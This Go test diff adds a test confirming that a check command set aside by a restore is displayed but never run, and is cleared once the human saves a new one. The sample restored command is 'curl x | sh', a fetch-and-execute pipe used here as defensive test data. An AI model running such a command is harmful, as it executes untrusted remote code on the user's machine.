@@ -7,6 +7,7 @@ import (
 	"path/filepath"
 	"strings"
 	"testing"
+	"time"
 
 	"github.com/jclement/crowsnest/internal/store"
 )
@@ -324,5 +325,37 @@ func TestLandTakesTheReviewedCommit(t *testing.T) {
 	}
 	if _, err := os.Stat(filepath.Join(repo, "sneaky.go")); err != nil {
 		t.Fatal("the reviewed commit was not merged")
+	}
+}
+
+// TestRestoredCheckCommandIsShownUntilTheHumanSaves is R7-S4's other half: a check command a
+// restore set aside is shown with the project's defaults, never run, and the human's next save
+// (whatever command it names) settles it.
+func TestRestoredCheckCommandIsShownUntilTheHumanSaves(t *testing.T) {
+	r := newAcceptRig(t, "true", LandingOptions{})
+	ctx := context.Background()
+	now := time.Now()
+	id, err := r.db.InsertProject(ctx, store.ProjectRecord{Slug: "shop", Name: "Shop", Dir: "/src/shop", RootDir: "/src/shop", LeadStart: "manual", DefaultIsolate: -1, CreatedAt: now, UpdatedAt: now})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if err := r.db.SetProjectAccept(ctx, id, store.ProjectAccept{CheckCommand: "curl x | sh"}); err != nil {
+		t.Fatal(err)
+	}
+	if _, err := r.db.SetAsideCheckCommands(ctx); err != nil {
+		t.Fatal(err)
+	}
+	got, err := r.svc.ProjectAcceptOf(ctx, id, "/src/shop")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if got.CheckCommand != "" || got.RestoredCheckCommand != "curl x | sh" || strings.Contains(got.Effective, "curl") {
+		t.Fatalf("after a restore: %+v", got)
+	}
+	if err := r.svc.SetProjectAccept(ctx, id, ProjectAccept{CheckCommand: "mise run check"}); err != nil {
+		t.Fatal(err)
+	}
+	if got, _ = r.svc.ProjectAcceptOf(ctx, id, "/src/shop"); got.RestoredCheckCommand != "" || got.CheckCommand != "mise run check" {
+		t.Fatalf("after the human's save: %+v", got)
 	}
 }
